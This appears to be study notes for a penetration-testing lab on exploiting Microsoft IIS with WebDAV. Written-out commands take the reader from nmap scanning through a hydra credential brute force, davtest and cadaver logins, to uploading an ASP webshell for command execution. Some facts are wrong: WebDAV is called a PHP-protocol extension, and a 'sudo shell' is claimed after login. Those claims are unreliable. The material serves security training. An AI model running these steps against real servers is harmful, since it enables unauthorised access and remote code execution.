
## Exploiting Microsoft IIS & WebDAV

**\-IIS (Internet Information Services)** is a proprietary extensible web server software developed by Microsoft.

\-Can host websites and provide a GUI for managing websites

\-Can host static and dynamic websites developed in ASP.NET and PHP

\-Run on ports 80/443

\-Supported executable file extensions:

*   .asp
*   .aspx
*   .config
*   .php

**\-WebDAV (Web-based Distributed Authoring and Versioning)** is a set of extensions to PHP protocol wich allow users to collaboratively edit and manage files on remote web servers.

\-Enables a web server to function as a filserver

\-Runs on top of Microsoft IIS on ports 80/443

\-Authentication in the form of username and passwords

### WebDAV Exploitation

**Steps:**

*   identify if WebDAV has been configured to run on the IIS server
*   can run brute-force attack on the WebDAV server in order to identify legitimate credentials
*   after obrtaining legitimate credentials, we can authenticate with WebDAV server and upload a malcious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

**Tools:**

*   **davtest -** used to scan, authenticate and exploit a WebDAV server
*   **cadaver** \- supports file upload, download, on-screen display, in-place editing, copy,move,create and delete files

Start a service detection scan with nmap scripts

```plaintext
namp -sV -sC 10.10.10.10
```

Further scan the 80 or 443 port to see the /webdav/ directory if the WebDAV is actually configured. “41 Unauthorized” means that authentication has been enabled on the WebDAV server.

```plaintext
nmap -sV -p 80 --script=http-enum 10.10.10.10
```

We can navigate to the directory using to browser.

```plaintext
10.10.10.10/webdav/
```

Perform a brute-force attack using hydra:

```plaintext
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt  10.10.10.10 http-get /webdav/
```

Using davtest to authenticate to WevDAV server. It will display a list of types of files we can upload or execute on the WebDAV server.

```plaintext
davtest -auth jack:jackspassword -url http://10.10.10.10/webdav
```

Now use cadaver to upload a shell

```plaintext
cadaver http://10.10.10.10/webdav
jack
jackspassword
```

Now you should have a sudo shell

Upload a webshell

```plaintext
put /usr/share/webshells/asp webshell.asp
```

Execute the webshell by clicking on it in the web browser.
